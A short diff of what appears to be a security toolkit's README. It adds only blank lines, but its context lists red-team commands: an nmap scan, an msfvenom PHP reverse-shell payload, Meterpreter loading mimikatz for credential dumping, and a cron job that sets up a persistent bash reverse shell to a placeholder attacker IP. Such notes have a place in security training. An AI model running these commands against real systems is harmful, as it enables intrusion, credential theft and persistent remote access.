@@ -112,6 +112,7 @@ Encrypts/decrypts files using Fernet (AES).
     decrypt_file(key, "encrypted.txt", "decrypted.txt")
 
 **Command-Line Tools:**
+
 1. Nmap Port Scanning
 
     nmap -sV -p- -T4 -oN nmap_scan.txt testphp.vulnweb.com
@@ -129,6 +130,7 @@ Encrypts/decrypts files using Fernet (AES).
     http.request.method == "POST"
 
 **Red Team Tasks**
+
 1. Metasploit Reverse Shell Payload
 
     msfvenom -p php/reverse_php LHOST=<YOUR_IP> LPORT=4444 -o shell.php
@@ -136,8 +138,10 @@ Encrypts/decrypts files using Fernet (AES).
 2. Meterpreter Post-Exploitation
 
     # After gaining shell:
+
     meterpreter > load mimikatz
     meterpreter > wdigest
+    
 3. Persistence via Cron Job
 
     echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" | crontab -
